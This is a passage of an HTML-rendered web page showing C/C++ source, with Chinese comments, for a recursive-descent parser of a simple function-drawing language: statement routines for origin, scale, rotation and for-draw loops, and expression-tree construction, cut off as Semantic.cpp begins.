punctuation">&#125;</span><span class="token comment">//绘图语言解释器入口（与主程序的外部接口）</span><span class="token keyword">void</span> <span class="token function">Parser</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>SrcFilePtr<span class="token punctuation">)</span><span class="token comment">//语法分析器的入口</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InitScanner</span><span class="token punctuation">(</span>SrcFilePtr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//初始化词法分析器</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Open Source File Error !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">FetchToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先获得一个记号</span><span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//然后进入Program递归子程序，递归下降分析</span><span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭词法分析器</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//程序Program的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">!=</span> NONTOKEN<span class="token punctuation">)</span><span class="token comment">//记号类型不为空</span><span class="token punctuation">&#123;</span><span class="token function">Statement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//程序有多个语句</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>SEMICO<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直到匹配到分隔符</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句Statment的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Statement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//罗列四种语句类型，分别分析</span><span class="token keyword">case</span> ORIGIN<span class="token operator">:</span> <span class="token function">OriginStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> SCALE<span class="token operator">:</span> <span class="token function">ScaleStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> ROT<span class="token operator">:</span>  <span class="token function">RotStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FOR<span class="token operator">:</span> <span class="token function">ForStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span> <span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//否则报错</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句OriginStatement的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">OriginStatement</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token comment">//语法树节点的类型</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>ORIGIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>IS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Tree_trace(tmp);</span>Origin_x <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取横坐标点平移距离</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除一棵树</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>COMMA<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//Tree_trace(tmp);</span>Origin_y <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取纵坐标点平移距离</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除一棵树</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句ScaleStatement的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ScaleStatement</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>SCALE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>IS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Tree_trace(tmp);</span>Scale_x <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取横坐标的比例因子</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>COMMA<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Tree_trace(tmp);</span>Scale_y <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取纵坐标的比例因子</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句RotStatement的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">RotStatement</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>ROT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>IS<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Tree_trace(tmp);</span>Rot_angle <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得旋转角度</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句ForStatement的递归子程序</span><span class="token comment">//对右部文法符号的展开->遇到终结符号直接匹配，遇到非终结符就调用相应子程序</span><span class="token comment">//ForStatement中唯一的非终结符是Expression，他出现在5个不同位置，分别代表循环的起始、终止、步长、横坐标、纵坐标，需要5个树节点指针保存这5棵语法树</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ForStatement</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//eg:for T from 0 to 2*pi step pi/50 draw (t, -sin(t));</span><span class="token keyword">double</span> Start<span class="token punctuation">,</span> End<span class="token punctuation">,</span> Step<span class="token punctuation">;</span><span class="token comment">//绘图起点、终点、步长</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>start_ptr<span class="token punctuation">,</span> <span class="token operator">*</span>end_ptr<span class="token punctuation">,</span> <span class="token operator">*</span>step_ptr<span class="token punctuation">,</span> <span class="token operator">*</span>x_ptr<span class="token punctuation">,</span> <span class="token operator">*</span>y_ptr<span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>FOR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>FROM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//eg:for T from</span>start_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Tree_trace(start_ptr);//获得参数起点表达式的语法树</span>Start <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>start_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//计算参数起点表达式的值</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>start_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放参数起点语法树所占空间</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>TO<span class="token punctuation">)</span><span class="token punctuation">;</span>end_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Tree_trace(end_ptr);//构造参数终点表达式语法树</span>End <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>end_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//计算参数终点表达式的值</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>end_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放参数终点语法树所占空间</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>STEP<span class="token punctuation">)</span><span class="token punctuation">;</span>step_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Tree_trace(step_ptr);//构造参数步长表达式语法树</span>Step <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>step_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//计算参数步长表达式的值</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>step_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放参数步长语法树所占空间</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>DRAW<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>x_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Tree_trace(x_ptr);</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>COMMA<span class="token punctuation">)</span><span class="token punctuation">;</span>y_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Tree_trace(y_ptr);</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">DrawLoop</span><span class="token punctuation">(</span>Start<span class="token punctuation">,</span> End<span class="token punctuation">,</span> Step<span class="token punctuation">,</span> x_ptr<span class="token punctuation">,</span> y_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//绘制图形</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>x_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放横坐标语法树所占空间</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>y_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放纵坐标语法树所占空间</span><span class="token punctuation">&#125;</span><span class="token comment">//（二元加减运算）表达式Expression的递归子程序，与上边不太相同的是，表达式需要为其构造语法树</span><span class="token comment">//把函数设计为语法树节点的指针，在函数内引进2个语法树节点的指针变量，分别作为Expression左右操作数（Term）的语法树节点指针</span><span class="token comment">//表达式应该是由正负号或无符号开头、由若干个项以加减号连接而成。</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//展开右部，并且构造语法树</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span><span class="token comment">//左右子树节点指针</span>Token_Type token_tmp<span class="token punctuation">;</span><span class="token comment">//当前记号</span>left <span class="token operator">=</span> <span class="token function">Term</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分析左操作数得到其语法树，左操作数是一个乘除运算表达式</span><span class="token keyword">while</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> PLUS <span class="token operator">||</span> token<span class="token punctuation">.</span>type <span class="token operator">==</span> MINUS<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token_tmp <span class="token operator">=</span> token<span class="token punctuation">.</span>type<span class="token punctuation">;</span><span class="token comment">//当前记号是加/减</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>token_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//匹配记号</span>right <span class="token operator">=</span> <span class="token function">Term</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分析右操作数得到其语法树，右操作数是一个乘除运算表达式</span>left <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>token_tmp<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//构造运算的语法树，结果为左子树</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> left<span class="token punctuation">;</span><span class="token comment">//返回的是当前记号节点</span><span class="token punctuation">&#125;</span><span class="token comment">//乘除运算表达式Term的递归子程序</span><span class="token comment">//项是由若干个因子以乘除号连接而成</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Term</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>Token_Type token_tmp<span class="token punctuation">;</span>left <span class="token operator">=</span> <span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> MUL <span class="token operator">||</span> token<span class="token punctuation">.</span>type <span class="token operator">==</span> DIV<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token_tmp <span class="token operator">=</span> token<span class="token punctuation">.</span>type<span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>token_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>left <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>token_tmp<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> left<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//一元加减运算Factor的递归子程序</span><span class="token comment">//因子则可能是一个标识符或一个数字，或是一个以括号括起来的子表达式</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> PLUS<span class="token punctuation">)</span><span class="token comment">//匹配一元加运算</span><span class="token punctuation">&#123;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>PLUS<span class="token punctuation">)</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> MINUS<span class="token punctuation">)</span><span class="token comment">//表达式退化为仅有右操作数的表达式</span><span class="token punctuation">&#123;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>MINUS<span class="token punctuation">)</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>left <span class="token operator">=</span> new ExprNode<span class="token punctuation">;</span>left<span class="token operator">-></span>OpCode <span class="token operator">=</span> CONST_ID<span class="token punctuation">;</span>left<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseConst <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>MINUS<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> right <span class="token operator">=</span> <span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//匹配非终结符Component</span><span class="token keyword">return</span> right<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//幂运算表达式Component的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//右结合</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>left <span class="token operator">=</span> <span class="token function">Atom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> POWER<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>POWER<span class="token punctuation">)</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//递归调用Component以实现POWER的右结合</span>left <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>POWER<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> left<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//原子表达式Atom的递归子程序，包括分隔符 函数 常数 参数</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Atom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">Token</span> t <span class="token operator">=</span> token<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>address<span class="token punctuation">,</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> CONST_ID<span class="token operator">:</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>CONST_ID<span class="token punctuation">)</span><span class="token punctuation">;</span>address <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>CONST_ID<span class="token punctuation">,</span> t<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T<span class="token operator">:</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>address <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FUNC<span class="token operator">:</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>FUNC<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Tree_trace(tmp);</span>address <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>FUNC<span class="token punctuation">,</span> t<span class="token punctuation">.</span>FuncPtr<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> L_BRACKET<span class="token operator">:</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>address <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Tree_trace(address);</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> address<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//生成语法树的一个节点，接收可变参数列表</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> opcode<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment">//注意这个函数是一个可变参数的函数</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>ExprPtr <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为新节点开辟空间</span>ExprPtr<span class="token operator">-></span>OpCode <span class="token operator">=</span> opcode<span class="token punctuation">;</span><span class="token comment">//向节点写入记号类别</span>va_list ArgPtr<span class="token punctuation">;</span><span class="token comment">//指向可变函数的参数的指针</span><span class="token function">va_start</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> opcode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化va_list变量，第一个参数也就是固定参数为opcode</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token comment">//根据记号的类别构造不同的节点</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> CONST_ID<span class="token operator">:</span><span class="token comment">//常数节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseConst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回可变参数，可变参数类型是常数</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T<span class="token operator">:</span><span class="token comment">//参数T节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseParmPtr <span class="token operator">=</span> <span class="token operator">&amp;</span>Parameter<span class="token punctuation">;</span><span class="token comment">//返回可变参数，可变参数类型是参数T</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FUNC<span class="token operator">:</span><span class="token comment">//函数调用节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>MathFuncPtr <span class="token operator">=</span> <span class="token punctuation">(</span>FuncPtr<span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> FuncPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可变参数类型是对应函数的指针</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>Child <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可变参数类型是节点</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token comment">//二元运算节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可变参数类型是节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同上</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">va_end</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//结束可变参数的获取</span><span class="token keyword">return</span> ExprPtr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="Semantic-cpp"><a href="#Semantic-cpp" class="headerlink" title="Semantic.cpp"></a>Semantic.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"semantic.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;windef.h></span></span>HDC 